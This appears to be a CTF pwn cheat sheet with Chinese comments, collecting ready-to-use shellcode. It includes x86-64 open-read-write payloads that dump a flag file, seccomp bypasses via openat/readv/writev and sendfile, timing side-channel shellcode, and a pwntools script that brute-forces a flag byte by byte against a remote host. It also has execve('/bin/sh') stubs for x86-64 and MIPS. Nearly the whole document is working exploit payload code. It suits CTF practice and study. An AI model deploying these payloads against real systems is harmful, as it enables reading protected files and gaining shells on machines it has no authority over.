# shellcode

orw+writev

```asm
xor rax, rax
mov al, 2
mov rdi, 0x67616c66
push rdi
mov rdi, rsp
xor rsi, rsi
mov sil, 0x0
xor rdx, rdx
syscall
mov r10, rax
xor rax, rax
mov al, 0
mov rdi, r10
sub rsp, 0x100
mov rsi, rsp
mov rdx, 0x100
syscall
mov rdi, 1
mov rbx,rsp
sub rsp, 16
pop rdx
push 0x100
push rbx
mov rsi, rsp
mov rdx, 1
mov rax, 20
syscall
```

## 测信道

```
 	movabs rax, 0x67616C66
    push 0
    push rax
    push rsp
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall 
    
    mov rsi, rdi
    mov rdi, rax           
    xor rax, rax
    mov rdx, 0x100
    syscall 
    mov al, [rsp+{}]
    cmp al, {}
    jbe $
```

```
shellcode = asm('''
mov r12, 0x67616c66 # 将字符串 "flag" 压入栈
push r12
mov rdi, rsp # 文件名指针
xor esi, esi # 文件模式
xor edx, edx
mov al, 2 # 系统调用号：open
syscall
mov rdi, rax # 文件描述符
mov rsi, 0x10700 # 缓冲区地址
mov dl, 0x40 # 读取字节数
xor rax, rax # 系统调用号：read
syscall
mov dl, byte ptr [rsi+{}] # 读取缓冲区中的字节
mov cl, {} # 猜测的字符
cmp cl, dl # 比较字符
jz loop # 如果相等，进入死循环
mov al, 60 # 系统调用号：exit
syscall
loop:
jmp loop # 死循环
'''.format(dis, char))
```

```
mov r12,0x000067616c662f2e
push r12
mov rdi,rsp
xor esi,esi
xor edx,edx
mov rax,2
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov dl, byte ptr [rsi+{}]
mov cl, {}
cmp cl,dl
jz loop
mov eax,60
syscall
loop:
jmp loop
```

### 0x70的测信道

```py
from pwn import *
context.arch='amd64'
# cli_script()
#
# debug = gift.debug
# filename = gift.filename

# if not debug:
#     ip = gift.ip
#     port = gift.port

# flag{2bb747aa-dabb-4826-a4d7-9fcb98b949f8}

shellcode = """
    /* alarm(0) */
    mov al, 0x25
    syscall
    /* recover key */
    mov ebp, 0xcafe000
    mov eax, dword ptr [rbp]
    xor eax, 0x67616c66
    mov ebx, dword ptr [rbp+0x28+4]
    shl rbx, 32
    or rbx, rax

    /* recover flag */
L1:
    xor qword ptr [rbp + 8 * rdx], rbx
    inc edx
    cmp dl, 6
    jnz L1
L2:
    cmp byte ptr [rbp + {}], {}
    jz L2 /* stuck */
"""

idx = 0
flag = ""

for _ in range(42):
    err = True
    for i in bytearray(b"-{{}}flagbcde0123456789"):
        io =remote("node5.buuoj.cn",25703)
        io.send(asm(shellcode.format(idx, hex(i))))
        if io.can_recv_raw(3):
            io.close()
            continue
        else:
            flag += chr(i)
            print(f"Now flag is : {flag}")
            io.close()
            err = False
            break
    if err:
        error("This round is wrong!")

    idx += 1


```



## orw普通的

shellcode正常使用的

```asm
\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05

0:  b0 3b                   mov    al, 0x3b    ; 将系统调用号 59 (0x3b) 放入 al 寄存器
2:  5f                      pop    rdi         ; 将栈顶数据弹出至 rdi (作为第1个参数)
3:  48 31 f6                xor    rsi, rsi    ; 将 rsi 清零 (作为第2个参数)
6:  48 31 d2                xor    rdx, rdx    ; 将 rdx 清零 (作为第3个参数)
9:  b0 3b                   mov    al, 0x3b    ; 再次将 59 (0x3b) 放入 al (稍微有点冗余)
b:  0f 05                   syscall            ; 触发系统调用
```



/ctfshow_flag

```asm
	mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c665f
    xor [rsp], rax
    mov rax, 0x776f68736674632f
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push 2 /* 2 */
    pop rax
    syscall
    /* call read(3, 0x123000, 0x64) */
    xor eax, eax /* SYS_read */
    push 3
    pop rdi
    push 0x64
    pop rdx
    mov esi, 0x1010101 /* 1191936 == 0x123000 */
    xor esi, 0x1133101
    syscall
    /* write(fd=1, buf=0x123000, n=0x64) */
    push 1
    pop rdi
    push 0x64
    pop rdx
    mov esi, 0x1010101 /* 1191936 == 0x123000 */
    xor esi, 0x1133101
    /* call write() */
    push 1 /* 1 */
    pop rax
    syscall
```

/flag

```asm
		lea rsp, [rip+0x2000]

        mov rax, 0x67616c662f 
        push rax
        mov rdi, rsp    
        xor rsi, rsi    
        xor rdx, rdx    
        push 2
        pop rax         
        syscall

        mov rdi, rax    
        xor rax, rax    
        mov rsi, rsp    
        push 0x70
        pop rdx         
        syscall

        mov rdx, rax
        push 1
        pop rdi     
        push 1
        pop rax     
        syscall
```



```asm
		/* open(file='/flag', oflag=0, mode=0) */
        /* push b'/flag\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x67616c662f
        xor [rsp], rax
        mov rdi, rsp
        xor edx, edx /* 0 */
        xor esi, esi /* 0 */
        /* call open() */
        push 2 /* 2 */
        pop rax
        syscall
        /* call read(3, 0x123000, 0x64) */
        xor eax, eax /* SYS_read */
        push 3
        pop rdi
        push 0x64
        pop rdx
        mov esi, 0x1010101 /* 1191936 == 0x123000 */
        xor esi, 0x1133101
        syscall
        /* write(fd=1, buf=0x123000, n=0x64) */
        push 1
        pop rdi
        push 0x64
        pop rdx
        mov esi, 0x1010101 /* 1191936 == 0x123000 */
        xor esi, 0x1133101
        /* call write() */
        push 1 /* 1 */
        pop rax
        syscall
```

## orw-x64(普通)

```asm
push 0x67616c66
mov rdi,rsp
xor esi,esi
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
```

## orw禁止使用read，open，witre

```asm
    /* 使用openat打开flag文件 */
    mov rax, 257        /* SYS_openat */
    mov rdi, -100       /* AT_FDCWD */
    lea rsi, [rip+flag_path]
    mov rdx, 0          /* O_RDONLY */
    mov r10, 0
    syscall

    /* 检查是否成功打开 */
    cmp rax, 0
    jl exit
    mov r12, rax        /* 保存文件描述符 */

    /* 准备readv的iovec结构 */
    lea rbx, [rip+iov]
    mov r13, rsp        /* 使用栈作为缓冲区 */
    sub r13, 0x1000     /* 确保有足够的栈空间 */
    mov qword ptr [rbx], r13    /* iov_base */
    mov qword ptr [rbx+8], 0x1000 /* iov_len = 4096 */

    /* 使用readv读取文件内容 */
    mov rax, 19         /* SYS_readv */
    mov rdi, r12        /* 文件描述符 */
    mov rsi, rbx        /* iovec指针 */
    mov rdx, 1          /* iovec数量 */
    syscall

    /* 保存读取的字节数 */
    mov r14, rax

    /* 更新iovec长度为实际读取的字节数 */
    mov qword ptr [rbx+8], r14

    /* 使用writev输出到stdout */
    mov rax, 20         /* SYS_writev */
    mov rdi, 1          /* stdout */
    mov rsi, rbx        /* iovec指针 */
    mov rdx, 1          /* iovec数量 */
    syscall

exit:
    /* 退出程序 */
    mov rax, 60
    mov rdi, 0
    syscall

flag_path:
    .asciz "flag"

iov:
    .quad 0
    .quad 0
```

### 禁用open read write

```py
from pwn import *

context(arch="amd64", os="linux")

#p = process("./vuln")
p = remote("xxx.xx.xxx.x",49443)
#gdb.attach(p,"b 0x1465")

shellcode = shellcraft.openat(-100,"flag",0)
#-100 AT_FDCWD当前目录
shellcode += shellcraft.sendfile(1,3,0,50)
#stdout 1 ;第一个打开的文件即flag 3
shellcode = asm(shellcode)


p.sendline(shellcode)

p.interactive()

```

## mips异构shellcode

```asm
/* execve(path='/bin/sh\x00', argv=0, envp=0) */
        /* push b'/bin/sh\x00' */
        li $t1, 0x2f62696e
        sw $t1, -8($sp)
        li $t9, ~0x2f736800
        not $t1, $t9
        sw $t1, -4($sp)
        addiu $sp, $sp, -8
        add $a0, $sp, $0 /* mov $a0, $sp */
        slti $a1, $zero, 0xFFFF /* $a1 = 0 */
        slti $a2, $zero, 0xFFFF /* $a2 = 0 */
        /* call execve() */
        ori $v0, $zero, (4000 + 11)
        syscall 0x40404  
```

